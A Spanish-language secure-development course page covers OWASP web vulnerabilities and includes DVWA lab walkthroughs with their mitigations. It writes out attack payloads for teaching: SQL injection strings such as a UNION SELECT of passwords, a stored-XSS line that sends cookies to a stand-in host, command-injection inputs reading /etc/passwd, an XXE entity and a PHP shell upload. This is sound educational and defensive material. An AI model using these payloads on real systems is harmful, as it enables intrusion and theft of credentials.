---
sidebar_position: 8
title: Vulnerabilidades web
slug: /modulo/modulo3/vulnera_web
description: Identificación y mitigación
keywords: [vulnerabilidad]
tags: [Ciberseguridad, Validación de Entradas,Desarrollo Seguro,OWASP Juice Shop
,Metodología VAPT,Inyección SQL,XSS (Cross-Site Scripting),Manejo de Excepciones,
Listas Blancas,Python / FastAPI]
---


[Volver](/docs/modulo/modulo3)
# Vulnerabilidades web: Identificación y mitigación

## El modelo de amenazas en la web
Las aplicaciones web modernas interactúan constantemente con fuentes externas: usuarios, servicios, APIs, bases de datos y sistemas de terceros.  
Cada una de esas interacciones representa una posible superficie de ataque.  
El enfoque OWASP (Open Web Application Security Project) propone identificar los vectores de vulnerabilidad más críticos y mitigarlos sistemáticamente.  

<!-- M302 3/39 -->
### Categorías de riesgos
Según el OWASP Top 10 (2021), las categorías de riesgo más comunes incluyen:  


<div class="row">
  <div class="col col--4 margin-bottom--md">
    <div class="card card--owasp shadow--md" >
      <div class="card__body">
        <div class="card-badge">A01</div>
        <h4 class="card-rule-title">[Pérdida de control de acceso][ref1] ![icono]</h4>
        <small class="card-year">Edición 2021</small>
      </div>
    </div>
  </div>
  <div class="col col--4 margin-bottom--md">
    <div class="card card--owasp shadow--md" >
      <div class="card__body">
        <div class="card-badge">A02</div>
        <h4 class="card-rule-title">[Fallas criptográficas][ref2] ![icono]</h4>
        <small class="card-year">Edición 2021</small>
      </div>
    </div>
  </div>
  <div class="col col--4 margin-bottom--md">
    <div class="card card--owasp shadow--md" >
      <div class="card__body">
        <div class="card-badge">A03</div>
        <h4 class="card-rule-title">[Inyección][ref3] ![icono]</h4>
        <small class="card-year">Edición 2021</small>
      </div>
    </div>
  </div>
  <div class="col col--4 margin-bottom--md">
    <div class="card card--owasp shadow--md" >
      <div class="card__body">
        <div class="card-badge">A04</div>
        <h4 class="card-rule-title">[Diseño inseguro][ref4] ![icono]</h4>
        <small class="card-year">Edición 2021</small>
      </div>
    </div>
  </div>
  <div class="col col--4 margin-bottom--md">
    <div class="card card--owasp shadow--md" >
      <div class="card__body">
        <div class="card-badge">A05</div>
        <h4 class="card-rule-title">[Configuración incorrecta de seguridad][ref5] ![icono]</h4>
        <small class="card-year">Edición 2021</small>
      </div>
    </div>
  </div>
  <div class="col col--4 margin-bottom--md">
    <div class="card card--owasp shadow--md" >
      <div class="card__body">
        <div class="card-badge">A06</div>
        <h4 class="card-rule-title">[Componentes vulnerables][ref6] ![icono]</h4>
        <small class="card-year">Edición 2021</small>
      </div>
    </div>
  </div>
  <div class="col col--4 margin-bottom--md">
    <div class="card card--owasp shadow--md" >
      <div class="card__body">
        <div class="card-badge">A07</div>
        <h4 class="card-rule-title">[Fallas de identificación y autenticación][ref7] ![icono]</h4>
        <small class="card-year">Edición 2021</small>
      </div>
    </div>
  </div>
  <div class="col col--4 margin-bottom--md">
    <div class="card card--owasp shadow--md" >
      <div class="card__body">
        <div class="card-badge">A08</div>
        <h4 class="card-rule-title">[Fallas en la integridad de datos y software][ref8] ![icono]</h4>
        <small class="card-year">Edición 2021</small>
      </div>
    </div>
  </div>
  <div class="col col--4 margin-bottom--md">
    <div class="card card--owasp shadow--md" >
      <div class="card__body">
        <div class="card-badge">A09</div>
        <h4 class="card-rule-title">[Fallos en logging y monitoreo][ref9] ![icono]</h4>
        <small class="card-year">Edición 2021</small>
      </div>
    </div>
  </div>
  <div class="col col--4 margin-bottom--md">
    <div class="card card--owasp shadow--md" >
      <div class="card__body">
        <div class="card-badge">A10</div>
        <h4 class="card-rule-title">[SSRF (Server-Side Request Forgery)][ref10] ![icono]</h4>
        <small class="card-year">Edición 2021</small>
      </div>
    </div>
  </div>
</div>

:::note Nota
En este sitio se desarrollan especialmente las vulnerabilidades de inyección, salida insegura (XSS), comandos del sistema operativo y deserialización/XXE/LDAP injection, todas ellas originadas en el manejo incorrecto de entradas no confiables.
:::

## Inyección SQL (SQLi)
<!-- M302 5/39 -->
### Fundamento teórico
La inyección SQL ocurre cuando el sistema ejecuta consultas construidas dinámicamente con datos ingresados por el usuario, sin filtrarlos ni parametrizarlos adecuadamente. El atacante aprovecha ese error para modificar la consulta original, obtener datos sensibles o alterar el comportamiento de la base de datos.  

### Causa principal
Concatenación directa de cadenas SQL.  

### Tipos de inyección SQL
**Inyección clásica o directa**: El atacante inserta comandos SQL visibles en los campos de entrada.  
Ejemplo: `' OR '1'='1`
Permite modificar el resultado de la consulta original.  

**Inyección ciega (Blind SQLi)**  
No devuelve mensajes de error visibles, pero permite inferir información mediante respuestas booleanas o tiempos de  espera.  
Ejemplo: usando IF(condition, SLEEP(5), 0) para detectar respuestas basadas en tiempo.  

**Inyección basada en errores (Error-based)**  
Aprovecha mensajes de error del servidor SQL para obtener datos del esquema o estructura de tablas.  
Ejemplo: provocar errores de tipo para exponer nombres de columnas.  

**Inyección fuera de banda (Out-of-band)**  
El atacante utiliza canales externos (como solicitudes HTTP o DNS) para recibir los resultados del ataque. Se usa cuando las respuestas directas están bloqueadas.  

### Ejemplo vulnerable
```bash
usuario = request.args.get("user")
query = f"SELECT * FROM usuarios WHERE
nombre='{usuario}'"
cursor.execute(query)
```

Si el atacante introduce:  
`' OR '1'='1`  

la consulta se transforma en:  
```bash
SELECT * FROM usuarios WHERE nombre='' OR
'1'='1'
```

Devuelve todos los usuarios.  

### Ejemplo seguro (consulta parametrizada)
```bash
cursor.execute("SELECT * FROM usuarios WHERE
nombre = %s", (usuario,))
```

Aquí el valor del parámetro no se concatena, sino que se envía de forma aislada al motor SQL, impidiendo la ejecución de código malicioso.  

:::note Nota
Ningún dato ingresado por el usuario debe confiarse directamente. Todos los parámetros deben ser validados, sanitizados y parametrizados antes de interactuar con la base de datos.  
:::

### Mitigaciones OWASP
● Usar consultas preparadas o parametrizadas (Prepared Statements).  
● Aplicar validación de tipo y formato antes de construir consultas.  
● Restringir los privilegios de la cuenta de base de datos (principio de mínimo privilegio).  
● Evitar mostrar mensajes de error SQL al usuario final.  
● Implementar escapes automáticos según el motor de base de datos (por ejemplo, psycopg2 en PostgreSQL o SQLAlchemy en Python).  

## Ejemplo práctico completo prevención de SQL Injection

### Código inseguro (vulnerable)
```bash
usuario = input("Usuario: ")
consulta = f"SELECT * FROM usuarios WHERE
nombre='{usuario}'"
cursor.execute(consulta)
```
Si el usuario ingresa:  
`' OR '1'='1`  

la consulta se convierte en:  
```SQL
SELECT * FROM usuarios WHERE nombre='' OR '1'='1'
```
y devuelve todos los registros.  

### Código seguro (usando parámetros)
```python
cursor.execute("SELECT * FROM usuarios WHERE nombre=%s", (usuario,))
```

El motor trata el parámetro como texto literal, evitando ejecución arbitraria.  

## Cross-Site Scripting (XSS)

El XSS ocurre cuando una aplicación inserta contenido controlado por el usuario en una página HTML sin aplicar un encoding adecuado. El atacante logra inyectar código JavaScript o HTML que se ejecuta en el navegador de otros usuarios.  

### Consecuencias
● Robo de cookies o tokens de sesión.  
● Desfiguración de páginas (defacement).  
● Redirecciones maliciosas.  
● Ejecución de comandos en nombre del usuario víctima.  

### XSS reflejado (Reflected XSS)
El ataque se ejecuta inmediatamente tras una petición manipulada, por ejemplo, a través de una URL, parámetro GET o formulario POST. El código malicioso se refleja temporalmente en la respuesta del servidor sin almacenarse.  

Ejemplo:  
```html
http://example.com/search?q=<script>alert('XSS')</script>
```
Si la aplicación muestra el valor de que sin validarlo, el script se ejecutará en el navegador del usuario que abra ese enlace.  

**Implicancias para el desarrollo:**  
● El riesgo aumenta en formularios, buscadores o paneles de administración.  
● Se usa comúnmente para phishing o robo de sesiones.  

**Mitigación:**  
● Escapar siempre los valores dinámicos antes de insertarlos en HTML.  
● Validar y restringir caracteres especiales en los parámetros de entrada.  
● Implementar filtros de contenido y cabeceras como Content-Security-Policy (CSP).  

### XSS almacenado (Stored XSS)
El script inyectado se almacena en la base de datos o en el sistema (por ejemplo, un comentario o nombre de usuario). Cada vez que otro usuario visualiza la página, el código se ejecuta.  
Ejemplo:  
Un atacante publica un comentario con:  

```html
<script>fetch('https://malicioso.com/steal?cookie='+document.cookie)</script>
```

El código queda guardado y se ejecuta para cada visitante de esa sección.  

**Implicancias para el desarrollo:**  
● Es el tipo más peligroso de XSS, ya que compromete múltiples usuarios.  
● Puede usarse para propagar malware, alterar datos o obtener credenciales de sesión.  

**Mitigación:**  
● Sanitizar y codificar los datos antes de almacenarlos y antes de mostrarlos.  
● Implementar una política de salida segura en plantillas o motores de renderizado `({{ variable | escape }})`.  
● Revisar todas las rutas donde se renderiza contenido dinámico.  

### XSS basado en DOM (DOM-based XSS)
El código malicioso no pasa por el servidor, sino que se ejecuta en el navegador del cliente manipulando el DOM (Document Object Model).  
Se aprovechan funciones como `innerHTML`, `document.write()` o `eval()` que insertan contenido dinámico sin filtrado.  
Ejemplo:  
```javascript
var name = location.hash.substring(1);
document.getElementById("msg").innerHTML = "Hola " + name;
```

Si un atacante usa la URL:  
```html
http://sitio.com/#<img src=x onerror=alert('XSS')>
```
el script se ejecutará directamente en el navegador.  

**Implicancias para el desarrollo:**  
● Común en aplicaciones SPA o frameworks modernos (React, Angular, Vue).  
● Dificultad de detección, ya que no deja rastros en el servidor.  
● Permite manipular la interfaz o inyectar scripts externos.  

**Mitigación:**  
● Evitar funciones inseguras (innerHTML, eval, document.write).  
● Usar métodos seguros como textContent o plantillas con encoding automático.  
● Activar CSP y auditar el uso del DOM en scripts del lado del cliente.  


## OS Command Injection
La inyección de comandos del sistema operativo (OS Command Injection) ocurre cuando una aplicación ejecuta comandos del sistema (como `ls`, `ping`, `cat`, `dir`) utilizando datos proporcionados por el usuario sin validarlos ni restringirlos adecuadamente.  
El atacante puede aprovechar esa entrada para inyectar comandos adicionales y ejecutar código arbitrario en el servidor.  

**Causa principal:**
Uso inseguro de funciones del sistema como system(), exec(), Runtime.exec() o subprocess() con parámetros directos del usuario.  

**Ejemplo vulnerable:**
```python
import os
ip = input("Ingrese una IP para hacer ping: ")
os.system("ping -c 3 " + ip)
```
Si el atacante introduce:  

```bash
8.8.8.8 && cat /etc/passwd
```
El sistema ejecutará ambos comandos: el ping y luego la lectura del archivo de contraseñas.  

**Impacto y riesgos**  
● Ejecución remota de código (RCE).  
● Acceso o eliminación de archivos del servidor.  
● Escalación de privilegios.  
● Compromiso total del sistema operativo.  

**Mitigaciones OWASP**  
● No ejecutar comandos del sistema si puede lograrse el mismo resultado mediante librerías internas o APIs seguras.  
● Si es inevitable, usar listas blancas de parámetros válidos y funciones seguras como:  
`subprocess.run(["ping", "-c", "3", ip], check=True)`  
● Validar estrictamente la entrada, permitiendo solo caracteres y formatos esperados (por ejemplo, expresiones regulares para IPs).  
● Ejecutar procesos con usuarios sin privilegios (principio de menor privilegio).  

:::note Nota
Cada vez que se ejecuta un comando del sistema con datos externos, se abre una puerta al atacante. La defensa consiste en validar, aislar y minimizar el uso del sistema operativo desde el código.  
:::

## File Upload
Un File Upload inseguro ocurre cuando una aplicación permite que los usuarios suban archivos sin controlar su tipo, tamaño o destino, posibilitando la ejecución de código malicioso en el servidor o el acceso a información sensible.  

### Causa principal:
Falta de validación de tipo MIME, extensión o ruta de almacenamiento.  

**Ejemplo vulnerable**
```python
archivo = request.files['file']
archivo.save('/var/www/uploads/' + archivo.filename)
```

Si el atacante sube un archivo con nombre:  

`shell.php`  

y el servidor permite interpretarlo, podrá ejecutar comandos remotamente al acceder a:  
`http://sitio.com/uploads/shell.php`

**Impacto y riesgos**  
● Ejecución remota de código si el archivo se interpreta por el servidor.  
● Sobrescritura de archivos existentes.  
● Fuga de información (por ejemplo, subiendo archivos en rutas accesibles públicamente).  
● Desbordamiento de disco o denegación de servicio (DoS) por tamaño excesivo de archivos.  

**Mitigaciones OWASP**  
● Validar tipo y extensión del archivo antes de guardarlo (por lista blanca, no negra).  
● Renombrar el archivo en el servidor y almacenar fuera del directorio público.  
● Verificar el tipo real (MIME) y tamaño máximo permitido.  
● Nunca ejecutar archivos cargados por el usuario; tratarlos como datos, no como código.  
● Escanear archivos subidos con antivirus o sandbox si el entorno lo permite.  

## Deserialización insegura, XXE y LDAP Injection
Ocurre cuando una aplicación vuelve a convertir (“deserializar”) datos recibidos (JSON, XML, pickles, binarios) en objetos/estructuras del programa sin validar su contenido. Algunas bibliotecas ejecutan código o crean objetos con efectos secundarios durante la deserialización.  

### Impacto (qué busca un atacante)
● Ejecución remota de código (RCE).  
● Alterar estado/atributos internos (por ej. cambiar flags de permisos o estados de pago).  
● Exposición de información sensible si el objeto rehidrata referencias a archivos o conexiones.  

**Mitigaciones prácticas**  
● Evitar deserializar datos de origen no confiable; preferir formatos seguros (JSON) sobre formatos que permiten ejecución (pickle, java-serialized).  
● Validar contra un schema estricto antes de construir objetos (lista blanca de campos y tipos).  
● Rechazar/ignorar campos inesperados.  
● Ejecutar la deserialización en sandbox o con usuarios/permisos limitados.  
● Mantener bibliotecas actualizadas y evitar funciones que permitan hooks/executables durante la carga.  

### XXE (XML External Entity)
Vulnerabilidad en parsers XML que permiten resolver entidades externas (external entities).  
Un XML puede incluir referencias `<!ENTITY ... SYSTEM "file:///etc/passwd">` que el parser trae y expone.  

**Impacto (qué busca un atacante)**  
● Lectura de archivos locales del servidor (ej.: `/etc/passwd`).
● SSRF / exfiltración: forzar al servidor a hacer peticiones a otros servicios.  
● Revelar estructura/configuración interna mediante mensajes de error.  

**Mitigaciones prácticas**  
● Desactivar la resolución de entidades externas en el parser XML (configurar disableExternalEntities, resolveEntities=false, según librería).  
● Usar parsers XML seguros o evitar XML si no es estrictamente necesario (usar JSON con validación).  
● Aplicar schemas XSD estrictos y sanitizar entradas.  
● Ejecutar parsers con privilegios mínimos y bloquear acceso a archivos sensibles.  

### LDAP Injection
Sucede cuando la aplicación construye consultas LDAP concatenando entradas del usuario (filtros) sin escape/validación, permitiendo que el atacante modifique el filtro LDAP (p. ej. `(|(uid=*)(uid=admin)))` y obtenga información extra o bypass de autenticación.  
Es el lugar donde se almacenan datos de usuarios, grupos, dispositivos o políticas.  

**Impacto (qué busca un atacante)**  
● Enumeración de usuarios y atributos (emails, roles).  
● Bypass de controles si la aplicación interpreta resultados manipulados.  
● Filtración de información sobre la estructura del directorio.  

**Mitigaciones prácticas**  
● No construir filtros mediante concatenación: usar APIs que acepten parámetros o funciones de escape para LDAP.  
● Validar y normalizar inputs (listas blancas de caracteres/formatos).  
● Limitar atributos devueltos y aplicar control de acceso en la cuenta que realiza consultas.  
● Monitorizar y limitar consultas sospechosas (rate limiting, alertas).  

Todo dato externo se debe tratar como no confiable: validar, normalizar, filtrar por lista blanca y aislar antes de procesar o “abrir” (deserializar, parsear, ejecutar).  

## Casos combinados y diseño seguro
### XSS + Session Hijacking
Un ataque XSS puede servir para inyectar código JavaScript que roba cookies o tokens de sesión de usuarios válidos.  
Ese token puede luego reutilizarse para un ataque de secuestro de sesión, accediendo a la cuenta de la víctima.  

**Diseño seguro:**  
● Implementar HttpOnly cookies (no accesibles por JavaScript).  
● Aplicar Content Security Policy (CSP).  
● Validar y escapar contenido antes de renderizarlo.  

### File Upload inseguro + Command Injection
Un upload sin control puede permitir subir un archivo con código malicioso (por ejemplo, un script PHP).  
Ese archivo, al ser ejecutado por el servidor, puede usarse para lanzar comandos del sistema operativo (Command Injection).  

**Diseño seguro:**  
● Validar extensiones y tipos MIME antes de guardar.  
● Almacenar los archivos fuera del directorio público.  
● Evitar que el servidor interprete los archivos subidos.  

### SQL Injection + Data Exposure
Una inyección SQL puede abrir acceso a datos sensibles almacenados sin cifrado o sin separación de privilegios.  
En este escenario, la falla técnica se potencia con una mala gestión de datos confidenciales.  

**Diseño seguro:**  
● Usar consultas parametrizadas y validación de tipo.  
● Cifrar y enmascarar información sensible (por ejemplo, números de tarjeta o contraseñas).  
● Aplicar el principio de mínimo privilegio en las cuentas de base de datos.  

### XXE + Deserialización insegura
Un parser XML vulnerable (XXE) puede entregar datos manipulados que luego se deserializan automáticamente.  
El atacante podría inyectar estructuras que ejecuten código o alteren objetos internos del sistema.  

**Diseño seguro:**  
● Desactivar la resolución de entidades externas.  
● Validar el contenido antes de deserializarlo.  
● Evitar el uso de librerías que permitan ejecución durante la deserialización.  

### LDAP Injection + Escalación de privilegios
Una consulta LDAP mal validada puede devolver más información de la prevista o permitir el acceso a cuentas con mayores privilegios.  
En combinación con otro vector (por ejemplo, XSS o SQLi), puede usarse para moverse lateralmente dentro de la red.  

**Diseño seguro:**  
● Usar funciones de escape o APIs seguras para consultas LDAP.  
● Separar privilegios por rol o servicio.  
● Implementar auditorías y monitoreo centralizado de logs.  

---
## Laboratorios
### Laboratorio 1
#### Ejercicio 1

<div className="mi-contenedor-verde">
  <h2>Objetivo</h2>
  Command Injection:<br></br>
  Deberás comprender cómo una aplicación vulnerable ejecuta comandos del sistema operativo con datos no confiables, analizar el código fuente de DVWA y aprender cómo sanitizar entradas para evitar inyección de comandos.<br></br>
</div>

### Consigna
1. Preparación del entorno. Levantar DVWA en Docker o Podman (_recomendable_). 
2. Ingresar a http://localhost/dvwa, loguearse y configurar DVWA en modo low desde `DVWA Security`.  
3. Ejecución de prueba en modo low:  
a. Ir al módulo `Command Injection`.  
b. Ingresar como valor: 127.0.0.1 para validar que la funcionalidad responde correctamente y pwd para saber donde estas.  comando: `127.0.0.1; pwd` o para saber qué hay, comando: `127.0.0.1; ls -la`
1. Análisis de código:
a. Abrir el archivo vulnerabilities/exec/source/low.php (o equivalente en tu DVWA).  
b. Pasar el código por IA con el prompt: 
```bash title="prompt"
"Explica como funciona este código, dónde se usan datos del usuario y por qué esto permite inyección de comandos.
Sugiere cómo sanitizar el input para prevenir este ataque".
``` 


Muestra de la aplicación DVWA corriendo con Podman en Windows 10 y accediendo desde una VM Kali Linux en Virtual Box:
![D](/img/m2/ssdlc_m2_dvwa.png)


### Resolución de ejercicio 1
#### Paso 1
* Preparación del entorno.  
* Levantar DVWA en Podman.
* Ingresar a http://localhost/dvwa.
* Acceder con usuario y password
* Configurar el modo **low** desde _DVWA Security_
  * Usuario: usuario, Password: password
  ![D](/img/m3/ssdlc_m3_dvwa_welc.png)
  * Ir al menú izquierdo, opción DVWA Security 
  ![D](/img/m3/ssdlc_m3_dvwa_sec_low.png)
  * Luego, deberás ir al menú izquierdo, opción DVWA Security y seleccionar el nivel **low**
  * Low deshabilita prácticamente todas las validaciones, lo que nos permite ver la aplicación en su estado más vulnerable. (Security Level: low)  

#### Paso 2: 
Ejecución de prueba en modo low:
* Selecciona el módulo `Command Injection` en el menú.
* En el campo Enter an IP address, escribe: `127.0.0.1; pwd` y `127.0.0.1; ls -la` 
* Luego, presiona **Submit**.

Muestra:
<!-- pwd -->
Con `127.0.0.1; pwd`  
![D](/img/m3/ssdlc_m3_dvwa_cominja.png)
<!-- ls -la -->
Con `127.0.0.1; ls -la`  
![D](/img/m3/ssdlc_m3_dvwa_cominjb.png)

Otro comando de ejemplo: `127.0.0.1; cat /etc/passwd`
![D](/img/m3/ssdlc_m3_dvwa_cominjc.png)

Al agregar `;` o `&&`, se le dice al sistema operativo que ejecute otro comando aparte del ping. DVWA devuelve el resultado de ambos, confirmando que es posible ejecutar comandos arbitrarios en el servidor.  

#### Paso 3: Análisis de código
a. Abre el archivo vulnerabilities/exec/source/low.php en un editor o visor de código.  
b. Utiliza IA (ChatGPT, Copilot, etc.) para explicar el riesgo. 

```bash title="prompt"
Explica por qué este código es vulnerable a command injection y
dame ejemplos de cómo sanitizar el input usando PHР.
<?php
if( isset( $_POST[ 'Submit' ]  ) ) {
    // Get input
    $target = $_REQUEST[ 'ip' ];

    // Determine OS and execute the ping command.
    if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
        // Windows
        $cmd = shell_exec( 'ping  ' . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( 'ping  -c 4 ' . $target );
    }

    // Feedback for the end user
    echo "<pre>{$cmd}</pre>";
}
?>
```

Este código es vulnerable a Command Injection (Inyección de Comandos) porque utiliza la entrada del usuario directamente dentro de una función de ejecución del sistema (shell_exec) sin ningún tipo de validación o limpieza.  
¿Por qué es vulnerable?  
La vulnerabilidad ocurre porque un atacante puede aprovechar los metacaracteres del shell (como `;`, `&`, `|`, `&&`) para "romper" el comando original y ejecutar comandos arbitrarios adicionales con los privilegios del servidor web.  
Ejemplo de ataque:  
Si el usuario envía como IP: `8.8.8.8; whoami`  
El servidor terminará ejecutando:  
`ping 8.8.8.8; whoami`  

Esto mostrará el resultado del ping y luego el nombre del usuario bajo el cual corre el servidor web, permitiendo a un atacante tomar control total del sistema.  
Cómo sanitizar el input en PHP  
1. Validación estricta (La mejor opción)
La forma más segura es validar que la entrada sea exactamente lo que esperas. Si esperas una IP, usa filter_var con el filtro `FILTER_VALIDATE_IP`.  

```php title="php"
$target = $_REQUEST['ip'];

// Validar que realmente sea una dirección IP válida
if (!filter_var($target, FILTER_VALIDATE_IP)) {
    die("Error: La IP no es válida.");
}

// Ahora $target es seguro para usar
$cmd = shell_exec('ping -c 4 ' . $target);
```

2. Uso de escapeshellarg()  
Si necesitas permitir nombres de dominio o entradas más variadas, usa escapeshellarg(). Esta función envuelve el argumento en comillas simples y escapa cualquier comilla interna, garantizando que todo el input sea tratado como un único argumento y nunca como un comando nuevo.  

```php title="php"
$target = $_REQUEST['ip'];

// Escapar el argumento para que el shell no interprete metacaracteres
$safe_target = escapeshellarg($target);
$cmd = shell_exec('ping -c 4 ' . $safe_target);
```

3. Uso de Listas Blancas (Whitelist)  
Si el input debe ser uno de varios valores fijos, compáralo contra un array de opciones permitidas.  

```php title="php"
$allowed_ips = ['127.0.0.1', '8.8.8.8', '192.168.1.1'];
$target = $_REQUEST['ip'];

if (!in_array($target, $allowed_ips)) {
    die("IP no autorizada.");
}
```
**Recomendación final**
Siempre que sea posible, evita usar funciones que interactúen directamente con el sistema operativo como shell_exec, exec, system o passthru. Prefiere funciones nativas de PHP o bibliotecas especializadas para realizar la tarea necesaria.  

Muestra de la IA:  
![D](/img/m3/ssdlc_m3_dvwa_cominj_prompt.png)


### Laboratorio 2
#### Ejercicio 1

**SQL Injection en DVWA**
Comprender cómo una aplicación vulnerable construye consultas SQL con datos no confiables, demostrar la explotación en DVWA y analizar el código para proponer una solución segura.  

#### Consignas
1. Iniciar DVWA y configurar el nivel de seguridad en low.  
2. Ir al módulo SQL Injection.  
a. Probar primero con un valor legítimo (1) y observar el resultado.  
b. Probar el siguiente payload:
i. `1' OR '1'=‘1`  
ii. Observar cómo cambia el resultado.  
c. Probar este payload:  
i. `1' UNION SELECT user,password
FROM users –`  
ii. Observar si muestra usuarios y contraseñas.  
3. Analizar el código del nivel low (low.php) usando IA y explicar por qué el input permite modificar la consulta.  
4. Explicar en qué consistiría una solución basada en los conceptos vistos en clase.  

A continuación, encontrarás la resolución al ejercicio para que puedas verificar cómo te fue.  

### Resolución ejercicio 1
1 .Iniciar DVWA y configurar el nivel de seguridad en **`low`**  
a. Abrir el navegador e ir a `http://localhost/dvwa`
Ingresar las credenciales por defecto:  
● Usuario: admin  
● Contraseña: password  
2. Ir al módulo **`SQL Injection`**  
a. Ingresa 1 en el campo User ID.  
b. Resultado: se muestran nombre y apellido del usuario con ID 1.  
c. Esto confirma que la aplicación hace una consulta a una base de datos basándose en el input del usuario.  

![D](/img/m3/ssdlc_m3_dvwa_sqlia.png)

d. A continuación, prueba la inyección de comillas dobles y simples para ver como interactúa con estos símbolos.  

![D](/img/m3/ssdlc_m3_dvwa_sqlib.png)
Al presionar `Submit` aparece lo siguiente...  
![D](/img/m3/ssdlc_m3_dvwa_sqlic.png)

e. El resultado refleja un error en la consulta de base de datos, por ende, la interacción va sin sanitizar a la misma.  

f. A continuación, prueba este payload y valida los riesgos de este problema de desarrollo:  
`1' OR '1'=‘1`
Este payload hace que la aplicación ignore el filtro y muestre varios resultados.   
Muestra:  
![D](/img/m3/ssdlc_m3_dvwa_sqlid.png)

### Analisis del código
Analizar el código del nivel low (low.php) usando IA y explicar por qué el input permite modificar la consulta.  

a. Para este punto debes dirigirte a **`View source`** y extraer el código de la aplicación analizada. Con este código podrás realizar el análisis dentro de ChatGPT 5 con el siguiente prompt.

```bash title="prompt"
“Eres un analista de código que se especializa
en encontrar fallas de seguridad en los
desarrollos de aplicaciones. Preciso que me
releves hallazgos de ciberseguridad, una
breve explicación de su riesgo e impacto y por
último la recomendación asociada para
mitigar el inconveniente”. 
```
Código:  
![D](/img/m3/ssdlc_m3_dvwa_sqlie.png)

```php title="php"
<?php

if( isset( $_REQUEST[ 'Submit' ] ) ) {
    // Get input
    $id = $_REQUEST[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

    mysqli_close($GLOBALS["___mysqli_ston"]);
}
?> 
```

Entendido. Como analista de seguridad, he revisado el fragmento de código PHP proporcionado. Este script presenta vulnerabilidades críticas que comprometen la integridad y confidencialidad de la base de datos y los usuarios.
Aquí tienes los hallazgos detallados:
1. Inyección SQL (SQLi)  
Riesgo e Impacto: El código concatena directamente la variable $id (proveniente de una solicitud del usuario vía $_REQUEST) en la consulta SQL sin ninguna sanitización. Un atacante podría enviar comandos maliciosos (ej. `' OR '1'='1`) para saltar autenticaciones, extraer la base de datos completa, modificar registros o incluso borrar tablas.
Recomendación: Utilizar Consultas Preparadas (Prepared Statements) con parámetros vinculados. Esto separa la lógica de la consulta de los datos proporcionados por el usuario.
2. Cross-Site Scripting (XSS) Reflejado  
Riesgo e Impacto: El valor de `$id` se imprime directamente en el HTML final (`echo "<pre>ID: {$id}...`) sin escapar. Un atacante podría inyectar scripts de JavaScript (ej. `<script>alert(document.cookie)</script>`) que se ejecutarían en el navegador de cualquier usuario que acceda a esa URL, permitiendo el robo de sesiones o redirecciones maliciosas.
Recomendación: Escapar la salida de datos utilizando funciones como htmlspecialchars() antes de renderizarlos en el navegador.
3. Exposición de Errores Técnicos  
Riesgo e Impacto: El uso de `die(mysqli_error(...))` es extremadamente peligroso en producción. Si la consulta falla, el servidor imprime detalles internos de la base de datos (nombres de tablas, columnas o sintaxis). Esta información es "oro" para un atacante en la fase de reconocimiento.
Recomendación: Implementar un manejo de errores genérico. Los errores detallados deben guardarse en un archivo de log interno, nunca mostrarse al usuario final.  
Ejemplo de Código Mitigado (Seguro)

```php title="php"
<?php
if( isset( $_GET[ 'id' ] ) ) {
    // 1. Usar sentencias preparadas para evitar SQLi
    $id = $_GET[ 'id' ];
    $link = $GLOBALS["___mysqli_ston"];

    $stmt = mysqli_prepare($link, "SELECT first_name, last_name FROM users WHERE user_id = ?");
    mysqli_stmt_bind_param($stmt, "s", $id); // "s" indica que el parámetro es un string
    mysqli_stmt_execute($stmt);
    $result = mysqli_stmt_get_result($stmt);

    while( $row = mysqli_fetch_assoc( $result ) ) {
        // 2. Escapar la salida para evitar XSS
        $safe_id = htmlspecialchars($id, ENT_QUOTES, 'UTF-8');
        $first = htmlspecialchars($row["first_name"], ENT_QUOTES, 'UTF-8');
        $last  = htmlspecialchars($row["last_name"], ENT_QUOTES, 'UTF-8');

        echo "<pre>ID: {$safe_id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }
    mysqli_stmt_close($stmt);
}
?>
```
Luego de analizar la respuesta dada por el LLM, los pasos a seguir para solucionar el inconveniente son:  
● Valida que id sea numérico.  
● Evita concatenación de strings.  
● Protege contra inyecciones SQL.  

## Proyecto Integrador
### Etapa 3

#### File Upload en DVWA
Analizar, explotar y mitigar vulnerabilidades de subida de archivos en una aplicación web, evaluando las protecciones en diferentes niveles de seguridad (low, medium, high, impossible).  

#### Escenario
Formas parte del equipo de desarrollo seguro de una empresa que detectó intentos de subir archivos maliciosos en su plataforma de carga de imágenes.  
Tu tarea es reproducir el ataque en un entorno controlado, entender el código vulnerable, evaluar las protecciones existentes y proponer mejoras para prevenir ejecución de código no autorizado en producción.  

#### Consignas
1. Configurar el entorno: Ingresar a DVWA, resetear la base de datos si es necesario y establecer el nivel de seguridad en low.  
2. Prueba en low:  
a. Subir un archivo malicioso (.php) y verificar si puede ejecutarse en el servidor.  
b. Documentar el resultado y guardar evidencia.  
c. Analizar el código fuente (low.php) y explicar por qué es vulnerable.  
3. Prueba en medium:
a. Repetir el intento de carga con el mismo archivo y variantes (doble extensión).  
b. Documentar resultados y analizar medium.php.  
c. Explicar qué controles existen y por qué pueden ser insuficientes.  

4. Prueba en high:
a. Subir nuevamente el archivo y verificar si la carga se bloquea o restringe.  
b. Analizar el código high.php y detallar las validaciones adicionales.  
5. Prueba en impossible:
a. Repetir el intento de carga y confirmar que la aplicación no permite la ejecución de archivos maliciosos.  
b. Analizar el código impossible.php y documentar las protecciones implementadas.  













<!-- Referencias -->
[ref1]:https://owasp.org/Top10/2021/es/A01_2021-Broken_Access_Control/
[ref2]:https://owasp.org/Top10/2021/es/A02_2021-Cryptographic_Failures/
[ref3]:https://owasp.org/Top10/2021/es/A01_2021-Injection/
[ref4]:https://owasp.org/Top10/2021/es/A04_2021-Insecure_Design/
[ref5]:https://owasp.org/Top10/2021/es/A05_2021-Security_Misconfiguration/
[ref6]:https://owasp.org/Top10/2021/es/A06_2021-Vulnerable_and_Outdated_Components/
[ref7]:https://owasp.org/Top10/2021/es/A07_2021-Identification_and_Authentication_Failures/
